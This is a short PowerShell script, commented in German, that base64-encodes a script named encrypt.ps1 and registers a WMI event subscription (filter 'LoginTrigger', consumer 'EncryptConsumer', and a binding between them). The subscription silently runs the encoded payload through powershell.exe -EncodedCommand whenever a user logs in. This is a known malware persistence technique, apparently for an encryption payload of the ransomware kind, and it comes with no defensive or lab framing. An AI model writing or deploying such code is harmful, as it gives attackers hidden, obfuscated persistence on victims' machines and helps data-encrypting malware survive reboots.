# encrypt base64 kodieren
$script = Get-Content -Path "C:\tmp\encrypt.ps1" -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
$encoded | Set-Content C:\tmp\encoded.txt

# Wmi-Event-Filter ersteleln
$Filter = @{
  Name      = "LoginTrigger"
  EventNamespace = "Root\Cimv2"
  QueryLanguage = "WQL"
  Query     = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
}
Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments $Filter

# WMI Aktion 
$encodedPayload = Get-Content C:\tmp\encoded.txt
$CommandLine = "powershell.exe -EncodedCommand $encodedPayload"

$Consumer = @{
  Name     = "EncryptConsumer"
  CommandLineTemplate = $CommandLine
}
Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments $Consumer

# Binding erstellt
$binding = @{
  Filter   = '__EventFilter.Name="LoginTrigger"'
  Consumer = 'CommandLineEventConsumer.Name="EncryptConsumer"'
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments $binding

